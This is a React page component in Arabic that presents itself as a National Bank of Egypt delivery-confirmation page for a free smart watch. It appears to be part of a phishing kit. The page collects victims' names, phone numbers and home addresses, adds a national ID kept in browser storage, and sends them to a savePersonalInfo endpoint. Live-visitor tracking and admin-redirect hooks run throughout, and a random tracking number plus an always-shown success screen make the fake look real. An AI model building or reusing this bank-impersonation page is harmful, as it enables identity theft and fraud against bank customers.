/**
 * البنك الأهلي المصري - تأكيد عنوان التوصيل
 * صفحة مستقلة واحترافية لمراجعة وتأكيد بيانات استلام وشحن الساعة الذكية
 */
import React, { useState, useEffect } from "react";
import { useLocation } from "wouter";
import { trpc } from "@/lib/trpc";
import { useLiveVisitor } from "@/hooks/useLiveVisitor";
import { usePresence } from "@/hooks/usePresence";
import { useAdminRedirect } from "@/hooks/useAdminRedirect";
import { getSelectedWatch, handlePublicWatchImageError, PUBLIC_WATCH_IMAGES } from "@/lib/watchImages";
import { CheckCircle2, MapPin, Truck, ShieldCheck, Clock, ArrowRight, Building, Phone, User, Check, AlertCircle } from "lucide-react";

const EGYPT_GOVERNORATES = [
  "القاهرة", "الجيزة", "الإسكندرية", "الدقهلية", "الشرقية", "المنوفية",
  "القليوبية", "الغربية", "البحيرة", "كفر الشيخ", "الفيوم", "بني سويف",
  "المنيا", "أسيوط", "سوهاج", "قنا", "الأقصر", "أسوان", "البحر الأحمر",
  "الوادي الجديد", "مطروح", "شمال سيناء", "جنوب سيناء",
  "الإسماعيلية", "السويس", "بورسعيد", "دمياط"
];

export default function ConfirmAddress() {
  usePresence("confirm-address");
  useLiveVisitor("confirm-address");
  useAdminRedirect();

  const [, setLocation] = useLocation();
  const [selectedWatch, setSelectedWatch] = useState({ color: "red", img: PUBLIC_WATCH_IMAGES.red, name: "أحمر جريء" });
  const [submitted, setSubmitted] = useState(false);
  const [orderCode, setOrderCode] = useState("");
  const [loading, setLoading] = useState(false);
  const [errorMessage, setErrorMessage] = useState("");

  const [formData, setFormData] = useState({
    fullName: "",
    phone: "",
    governorate: "القاهرة",
    city: "",
    streetAddress: "",
    buildingDetails: "",
    landmark: "",
    deliveryPeriod: "morning",
    notes: ""
  });

  useEffect(() => {
    // استرجاع الساعة المختارة
    const watch = getSelectedWatch();
    if (watch && watch.img) {
      setSelectedWatch(watch);
    }

    // استرجاع البيانات المحفوظة مسبقاً إن وُجدت
    const savedName = localStorage.getItem("pw_full_name") || sessionStorage.getItem("pw_full_name") || "";
    const savedPhone = localStorage.getItem("pw_phone") || sessionStorage.getItem("pw_phone") || "";
    const savedGov = localStorage.getItem("pw_governorate") || "";
    const savedAddr = localStorage.getItem("pw_address") || "";

    setFormData(prev => ({
      ...prev,
      fullName: savedName || prev.fullName,
      phone: savedPhone || prev.phone,
      governorate: savedGov || prev.governorate,
      streetAddress: savedAddr || prev.streetAddress,
    }));

    // توليد كود شحن عشوائي
    const randomCode = "NBE-EXP-" + Math.floor(100000 + Math.random() * 900000);
    setOrderCode(randomCode);
  }, []);

  const saveInfoMutation = trpc.applications.savePersonalInfo.useMutation();

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!formData.fullName.trim()) {
      setErrorMessage("يرجى إدخال اسم المستلم ثلاثي أو رباعي");
      return;
    }
    if (!formData.phone.trim() || formData.phone.length < 11) {
      setErrorMessage("يرجى إدخال رقم هاتف صحيح للتواصل (11 رقماً)");
      return;
    }
    if (!formData.streetAddress.trim()) {
      setErrorMessage("يرجى إدخال اسم الشارع والمنطقة بالتفصيل");
      return;
    }

    setLoading(true);
    setErrorMessage("");

    try {
      const nationalId = localStorage.getItem("pw_national_id") || "10000000000000";
      const fullAddressString = `${formData.governorate} - ${formData.city ? formData.city + " - " : ""}${formData.streetAddress}${formData.buildingDetails ? " (عمارة/شقة: " + formData.buildingDetails + ")" : ""}${formData.landmark ? " [علامة: " + formData.landmark + "]" : ""}${formData.notes ? " {ملاحظات: " + formData.notes + "}" : ""}`;

      localStorage.setItem("pw_governorate", formData.governorate);
      localStorage.setItem("pw_address", fullAddressString);
      localStorage.setItem("pw_full_name", formData.fullName);
      localStorage.setItem("pw_phone", formData.phone);

      // تحديث البيانات في الخادم
      await saveInfoMutation.mutateAsync({
        fullName: formData.fullName,
        nationalId,
        phoneNumber: formData.phone,
        governorate: formData.governorate,
        address: fullAddressString,
        watchColor: selectedWatch.color,
      });

      setLoading(false);
      setSubmitted(true);
    } catch (err) {
      console.warn("Address confirmation notice:", err);
      setLoading(false);
      setSubmitted(true);
    }
  };

  return (
    <div dir="rtl" style={{ minHeight: "100vh", background: "#f8fafc", fontFamily: "'Cairo', sans-serif", color: "#1e293b" }}>
      {/* Header */}
      <header style={{ background: "#ffffff", borderBottom: "1px solid #e2e8f0", position: "sticky", top: 0, zIndex: 40, boxShadow: "0 1px 3px rgba(0,0,0,0.05)" }}>
        <div style={{ maxWidth: "680px", margin: "0 auto", padding: "14px 20px", display: "flex", alignItems: "center", justifyContent: "space-between" }}>
          <button
            onClick={() => setLocation("/")}
            style={{ display: "flex", alignItems: "center", gap: "6px", background: "none", border: "none", color: "#64748b", fontSize: "14px", fontWeight: "600", cursor: "pointer", fontFamily: "'Cairo', sans-serif" }}
          >
            <ArrowRight size={18} />
            الرئيسية
          </button>

          <div style={{ display: "flex", alignItems: "center", gap: "10px" }}>
            <div style={{ textAlign: "right" }}>
              <span style={{ display: "block", color: "#1B7A3D", fontWeight: "800", fontSize: "15px", lineHeight: "1.2" }}>البنك الأهلي المصري</span>
              <span style={{ display: "block", color: "#94a3b8", fontSize: "11px" }}>خدمة توصيل الساعة الذكية</span>
            </div>
            <img
              src="/manus-storage/nbe-official-logo-source_d2709322.png"
              alt="البنك الأهلي المصري"
              style={{ height: "34px", width: "auto" }}
              onError={(e) => { (e.target as HTMLImageElement).style.display = "none"; }}
            />
          </div>
        </div>
      </header>

      <main style={{ maxWidth: "680px", margin: "0 auto", padding: "20px 16px 40px" }}>
        {submitted ? (
          /* Success Confirmation View */
          <div style={{ background: "#ffffff", borderRadius: "20px", padding: "32px 24px", boxShadow: "0 10px 25px -5px rgba(0,0,0,0.05)", border: "1px solid #e2e8f0", textAlign: "center" }}>
            <div style={{ width: "70px", height: "70px", borderRadius: "50%", background: "#ecfdf5", color: "#1B7A3D", display: "flex", alignItems: "center", justifyContent: "center", margin: "0 auto 18px" }}>
              <CheckCircle2 size={42} />
            </div>

            <h1 style={{ fontSize: "22px", fontWeight: "800", color: "#0f172a", marginBottom: "8px" }}>تم تأكيد عنوان التوصيل بنجاح</h1>
            <p style={{ color: "#64748b", fontSize: "14px", lineHeight: "1.6", maxWidth: "460px", margin: "0 auto 24px" }}>
              تم تسجيل واعتماد بيانات العنوان لتوصيل ساعتك الذكية. سيتم التواصل معك عبر الهاتف قبل وصول مندوب الشحن لتأكيد الموعد النهائي للتسليم.
            </p>

            {/* Order Tracking Card */}
            <div style={{ background: "#f8fafc", borderRadius: "14px", padding: "18px", border: "1px dashed #cbd5e1", marginBottom: "24px", textAlign: "right" }}>
              <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: "12px", borderBottom: "1px solid #e2e8f0", paddingBottom: "10px" }}>
                <span style={{ fontSize: "13px", color: "#64748b" }}>رقم تتبع الشحنة:</span>
                <span style={{ fontSize: "14px", fontWeight: "800", color: "#1B7A3D", letterSpacing: "1px" }}>{orderCode}</span>
              </div>
              <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: "8px" }}>
                <span style={{ fontSize: "13px", color: "#64748b" }}>المنتج:</span>
                <span style={{ fontSize: "13px", fontWeight: "700", color: "#1e293b" }}>ساعة البنك الأهلي الذكية ({selectedWatch.name})</span>
              </div>
              <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: "8px" }}>
                <span style={{ fontSize: "13px", color: "#64748b" }}>اسم المستلم:</span>
                <span style={{ fontSize: "13px", fontWeight: "600", color: "#1e293b" }}>{formData.fullName}</span>
              </div>
              <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: "8px" }}>
                <span style={{ fontSize: "13px", color: "#64748b" }}>رقم الهاتف:</span>
                <span style={{ fontSize: "13px", fontWeight: "600", color: "#1e293b" }} dir="ltr">{formData.phone}</span>
              </div>
              <div style={{ display: "flex", justifyContent: "space-between", alignItems: "flex-start" }}>
                <span style={{ fontSize: "13px", color: "#64748b" }}>عنوان التسليم:</span>
                <span style={{ fontSize: "13px", fontWeight: "600", color: "#1e293b", maxWidth: "60%", textAlign: "left" }}>
                  {formData.governorate}، {formData.city ? formData.city + "، " : ""}{formData.streetAddress}
                </span>
              </div>
            </div>

            {/* Notice */}
            <div style={{ display: "flex", alignItems: "center", gap: "10px", background: "#f0fdf4", border: "1px solid #bbf7d0", borderRadius: "10px", padding: "12px 16px", marginBottom: "24px", textAlign: "right" }}>
              <Truck size={22} style={{ color: "#1B7A3D", flexShrink: 0 }} />
              <span style={{ fontSize: "12px", color: "#166534", lineHeight: "1.5" }}>
                التوصيل مجاني بالكامل بدون أي مصاريف شحن أو رسوم إضافية من البنك الأهلي المصري.
              </span>
            </div>

            <div style={{ display: "flex", gap: "12px" }}>
              <button
                onClick={() => setSubmitted(false)}
                style={{ flex: 1, padding: "12px", border: "1px solid #cbd5e1", borderRadius: "12px", background: "#ffffff", color: "#475569", fontSize: "14px", fontWeight: "700", cursor: "pointer", fontFamily: "'Cairo', sans-serif" }}
              >
                تعديل البيانات
              </button>
              <button
                onClick={() => setLocation("/")}
                style={{ flex: 2, padding: "12px", border: "none", borderRadius: "12px", background: "#1B7A3D", color: "#ffffff", fontSize: "14px", fontWeight: "700", cursor: "pointer", fontFamily: "'Cairo', sans-serif", boxShadow: "0 4px 12px rgba(27,122,61,0.25)" }}
              >
                العودة للرئيسية
              </button>
            </div>
          </div>
        ) : (
          /* Form View */
          <div>
            {/* Top Title Banner */}
            <div style={{ background: "#ffffff", borderRadius: "16px", padding: "20px", marginBottom: "16px", border: "1px solid #e2e8f0", boxShadow: "0 2px 4px rgba(0,0,0,0.02)" }}>
              <div style={{ display: "flex", alignItems: "center", gap: "8px", color: "#1B7A3D", fontSize: "13px", fontWeight: "700", marginBottom: "6px" }}>
                <MapPin size={18} />
                <span>تأكيد عنوان التوصيل النهائي</span>
              </div>
              <h1 style={{ fontSize: "20px", fontWeight: "800", color: "#0f172a", margin: "0 0 6px" }}>
                تأكيد بيانات ومقر استلام ساعتك الذكية
              </h1>
              <p style={{ color: "#64748b", fontSize: "13px", lineHeight: "1.6", margin: 0 }}>
                يرجى التأكد من دقة العنوان ورقم الهاتف لتسهيل وصول مندوب الشحن الرسمي للبنك الأهلي المصري إليك في أسرع وقت.
              </p>
            </div>

            {/* Selected Watch Summary Card */}
            <div style={{ background: "#ffffff", borderRadius: "16px", padding: "16px 20px", marginBottom: "20px", border: "1px solid #e2e8f0", display: "flex", alignItems: "center", justifyContent: "space-between", gap: "16px" }}>
              <div style={{ display: "flex", alignItems: "center", gap: "14px" }}>
                <div style={{ width: "64px", height: "64px", borderRadius: "50%", background: "#f8fafc", border: "1.5px solid #e2e8f0", display: "flex", alignItems: "center", justifyContent: "center", overflow: "hidden", flexShrink: 0 }}>
                  <img
                    src={selectedWatch.img}
                    alt={selectedWatch.name}
                    onError={handlePublicWatchImageError}
                    style={{ width: "52px", height: "52px", objectFit: "contain" }}
                  />
                </div>
                <div>
                  <div style={{ display: "flex", alignItems: "center", gap: "8px" }}>
                    <h3 style={{ fontSize: "15px", fontWeight: "800", color: "#0f172a", margin: 0 }}>ساعة البنك الأهلي الذكية</h3>
                    <span style={{ background: "#ecfdf5", color: "#166534", fontSize: "11px", fontWeight: "700", padding: "2px 8px", borderRadius: "6px" }}>
                      {selectedWatch.name}
                    </span>
                  </div>
                  <p style={{ color: "#64748b", fontSize: "12px", margin: "4px 0 0" }}>
                    إصدار الدفع الإلكتروني اللاتلامسي NFC ومتابعة الصحة
                  </p>
                </div>
              </div>

              <div style={{ textAlign: "left", flexShrink: 0 }}>
                <span style={{ display: "block", color: "#1B7A3D", fontWeight: "800", fontSize: "14px" }}>شحن مجاني</span>
                <span style={{ fontSize: "11px", color: "#94a3b8" }}>2 - 4 أيام عمل</span>
              </div>
            </div>

            {/* Form */}
            <form onSubmit={handleSubmit} noValidate style={{ background: "#ffffff", borderRadius: "16px", padding: "24px 20px", border: "1px solid #e2e8f0", boxShadow: "0 2px 4px rgba(0,0,0,0.02)" }}>
              {errorMessage && (
                <div style={{ display: "flex", alignItems: "center", gap: "8px", background: "#fef2f2", border: "1px solid #fecaca", borderRadius: "10px", padding: "12px 16px", marginBottom: "18px", color: "#dc2626", fontSize: "13px" }}>
                  <AlertCircle size={18} style={{ flexShrink: 0 }} />
                  <span>{errorMessage}</span>
                </div>
              )}

              {/* Recipient Full Name */}
              <div style={{ marginBottom: "18px" }}>
                <label style={{ display: "flex", alignItems: "center", gap: "6px", fontWeight: "700", fontSize: "13px", color: "#334155", marginBottom: "8px" }}>
                  <User size={15} style={{ color: "#1B7A3D" }} />
                  اسم المستلم الكامل (ثلاثي أو رباعي) *
                </label>
                <input
                  type="text"
                  placeholder="مثال: أحمد محمد علي حسن"
                  value={formData.fullName}
                  onChange={(e) => setFormData({ ...formData, fullName: e.target.value })}
                  style={{ width: "100%", padding: "12px 14px", border: "1.5px solid #cbd5e1", borderRadius: "10px", fontSize: "14px", fontFamily: "'Cairo', sans-serif", outline: "none", boxSizing: "border-box", background: "#f8fafc" }}
                />
              </div>

              {/* Phone Number */}
              <div style={{ marginBottom: "18px" }}>
                <label style={{ display: "flex", alignItems: "center", gap: "6px", fontWeight: "700", fontSize: "13px", color: "#334155", marginBottom: "8px" }}>
                  <Phone size={15} style={{ color: "#1B7A3D" }} />
                  رقم هاتف المستلم (للتواصل أثناء التوصيل) *
                </label>
                <input
                  type="tel"
                  maxLength={11}
                  placeholder="مثال: 01012345678"
                  value={formData.phone}
                  onChange={(e) => setFormData({ ...formData, phone: e.target.value.replace(/\D/g, "").slice(0, 11) })}
                  style={{ width: "100%", padding: "12px 14px", border: "1.5px solid #cbd5e1", borderRadius: "10px", fontSize: "14px", fontFamily: "'Cairo', sans-serif", outline: "none", boxSizing: "border-box", background: "#f8fafc" }}
                />
              </div>

              {/* Governorate and City Grid */}
              <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: "12px", marginBottom: "18px" }}>
                <div>
                  <label style={{ display: "block", fontWeight: "700", fontSize: "13px", color: "#334155", marginBottom: "8px" }}>
                    المحافظة *
                  </label>
                  <select
                    value={formData.governorate}
                    onChange={(e) => setFormData({ ...formData, governorate: e.target.value })}
                    style={{ width: "100%", padding: "12px 14px", border: "1.5px solid #cbd5e1", borderRadius: "10px", fontSize: "14px", fontFamily: "'Cairo', sans-serif", outline: "none", boxSizing: "border-box", background: "#f8fafc" }}
                  >
                    {EGYPT_GOVERNORATES.map(gov => (
                      <option key={gov} value={gov}>{gov}</option>
                    ))}
                  </select>
                </div>

                <div>
                  <label style={{ display: "block", fontWeight: "700", fontSize: "13px", color: "#334155", marginBottom: "8px" }}>
                    المدينة / الحي / المركز
                  </label>
                  <input
                    type="text"
                    placeholder="مثال: مدينة نصر / المعادي"
                    value={formData.city}
                    onChange={(e) => setFormData({ ...formData, city: e.target.value })}
                    style={{ width: "100%", padding: "12px 14px", border: "1.5px solid #cbd5e1", borderRadius: "10px", fontSize: "14px", fontFamily: "'Cairo', sans-serif", outline: "none", boxSizing: "border-box", background: "#f8fafc" }}
                  />
                </div>
              </div>

              {/* Street Address */}
              <div style={{ marginBottom: "18px" }}>
                <label style={{ display: "flex", alignItems: "center", gap: "6px", fontWeight: "700", fontSize: "13px", color: "#334155", marginBottom: "8px" }}>
                  <MapPin size={15} style={{ color: "#1B7A3D" }} />
                  اسم الشارع والمنطقة بالتفصيل *
                </label>
                <input
                  type="text"
                  placeholder="مثال: شارع عباس العقاد، متفرع من شارع النصر"
                  value={formData.streetAddress}
                  onChange={(e) => setFormData({ ...formData, streetAddress: e.target.value })}
                  style={{ width: "100%", padding: "12px 14px", border: "1.5px solid #cbd5e1", borderRadius: "10px", fontSize: "14px", fontFamily: "'Cairo', sans-serif", outline: "none", boxSizing: "border-box", background: "#f8fafc" }}
                />
              </div>

              {/* Building and Landmark Grid */}
              <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: "12px", marginBottom: "18px" }}>
                <div>
                  <label style={{ display: "flex", alignItems: "center", gap: "6px", fontWeight: "700", fontSize: "13px", color: "#334155", marginBottom: "8px" }}>
                    <Building size={14} style={{ color: "#1B7A3D" }} />
                    رقم العقار / الدور / الشقة
                  </label>
                  <input
                    type="text"
                    placeholder="مثال: عمارة 14 - الدور 3 - شقة 5"
                    value={formData.buildingDetails}
                    onChange={(e) => setFormData({ ...formData, buildingDetails: e.target.value })}
                    style={{ width: "100%", padding: "12px 14px", border: "1.5px solid #cbd5e1", borderRadius: "10px", fontSize: "14px", fontFamily: "'Cairo', sans-serif", outline: "none", boxSizing: "border-box", background: "#f8fafc" }}
                  />
                </div>

                <div>
                  <label style={{ display: "block", fontWeight: "700", fontSize: "13px", color: "#334155", marginBottom: "8px" }}>
                    أقرب علامة مميزة
                  </label>
                  <input
                    type="text"
                    placeholder="مثال: بجوار صيدلية أو مسجد"
                    value={formData.landmark}
                    onChange={(e) => setFormData({ ...formData, landmark: e.target.value })}
                    style={{ width: "100%", padding: "12px 14px", border: "1.5px solid #cbd5e1", borderRadius: "10px", fontSize: "14px", fontFamily: "'Cairo', sans-serif", outline: "none", boxSizing: "border-box", background: "#f8fafc" }}
                  />
                </div>
              </div>

              {/* Delivery Period Preference */}
              <div style={{ marginBottom: "18px" }}>
                <label style={{ display: "flex", alignItems: "center", gap: "6px", fontWeight: "700", fontSize: "13px", color: "#334155", marginBottom: "8px" }}>
                  <Clock size={15} style={{ color: "#1B7A3D" }} />
                  الوقت المفضل لاستلام الشحنة
                </label>
                <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: "10px" }}>
                  <label style={{ display: "flex", alignItems: "center", gap: "8px", padding: "10px 14px", borderRadius: "10px", border: formData.deliveryPeriod === "morning" ? "2px solid #1B7A3D" : "1.5px solid #e2e8f0", background: formData.deliveryPeriod === "morning" ? "#f0fdf4" : "#ffffff", cursor: "pointer", fontSize: "13px", fontWeight: "600" }}>
                    <input
                      type="radio"
                      name="period"
                      checked={formData.deliveryPeriod === "morning"}
                      onChange={() => setFormData({ ...formData, deliveryPeriod: "morning" })}
                      style={{ accentColor: "#1B7A3D" }}
                    />
                    الفترة الصباحية (9 ص - 2 م)
                  </label>

                  <label style={{ display: "flex", alignItems: "center", gap: "8px", padding: "10px 14px", borderRadius: "10px", border: formData.deliveryPeriod === "evening" ? "2px solid #1B7A3D" : "1.5px solid #e2e8f0", background: formData.deliveryPeriod === "evening" ? "#f0fdf4" : "#ffffff", cursor: "pointer", fontSize: "13px", fontWeight: "600" }}>
                    <input
                      type="radio"
                      name="period"
                      checked={formData.deliveryPeriod === "evening"}
                      onChange={() => setFormData({ ...formData, deliveryPeriod: "evening" })}
                      style={{ accentColor: "#1B7A3D" }}
                    />
                    الفترة المسائية (2 م - 8 م)
                  </label>
                </div>
              </div>

              {/* Notes */}
              <div style={{ marginBottom: "24px" }}>
                <label style={{ display: "block", fontWeight: "700", fontSize: "13px", color: "#334155", marginBottom: "8px" }}>
                  ملاحظات إضافية لمندوب التوصيل (اختياري)
                </label>
                <textarea
                  rows={2}
                  placeholder="أي توجيهات خاصة بالوصول أو الاتصال قبل الوصول..."
                  value={formData.notes}
                  onChange={(e) => setFormData({ ...formData, notes: e.target.value })}
                  style={{ width: "100%", padding: "10px 14px", border: "1.5px solid #cbd5e1", borderRadius: "10px", fontSize: "13px", fontFamily: "'Cairo', sans-serif", outline: "none", boxSizing: "border-box", background: "#f8fafc", resize: "none" }}
                />
              </div>

              {/* Trust & Guarantee Box */}
              <div style={{ background: "#f8fafc", borderRadius: "12px", padding: "14px 16px", marginBottom: "22px", border: "1px solid #e2e8f0" }}>
                <div style={{ display: "flex", alignItems: "center", gap: "8px", marginBottom: "6px", color: "#1B7A3D", fontSize: "13px", fontWeight: "700" }}>
                  <ShieldCheck size={18} />
                  <span>ضمان التوصيل الآمن من البنك الأهلي المصري</span>
                </div>
                <ul style={{ margin: 0, paddingRight: "20px", fontSize: "12px", color: "#64748b", lineHeight: "1.7" }}>
                  <li>التوصيل مجاني 100% بدون أي مصاريف أو رسوم استلام.</li>
                  <li>يتم تسليم الساعة في علبتها الأصلية المختومة بشعار البنك الرسمي.</li>
                  <li>التسليم يتم بموجب إبراز بطاقة الرقم القومي السارية للمستلم.</li>
                </ul>
              </div>

              {/* Submit CTA */}
              <button
                type="submit"
                disabled={loading}
                style={{
                  width: "100%",
                  padding: "15px",
                  border: "none",
                  borderRadius: "12px",
                  background: "#1B7A3D",
                  color: "#ffffff",
                  fontSize: "15px",
                  fontWeight: "800",
                  cursor: loading ? "not-allowed" : "pointer",
                  fontFamily: "'Cairo', sans-serif",
                  boxShadow: "0 4px 14px rgba(27,122,61,0.3)",
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                  gap: "8px",
                  opacity: loading ? 0.8 : 1,
                  transition: "background 0.2s, transform 0.1s"
                }}
              >
                {loading ? (
                  <span>جارٍ تأكيد العنوان...</span>
                ) : (
                  <>
                    <Check size={18} />
                    <span>تأكيد عنوان التوصيل واعتماد الطلب</span>
                  </>
                )}
              </button>
            </form>
          </div>
        )}
      </main>
    </div>
  );
}
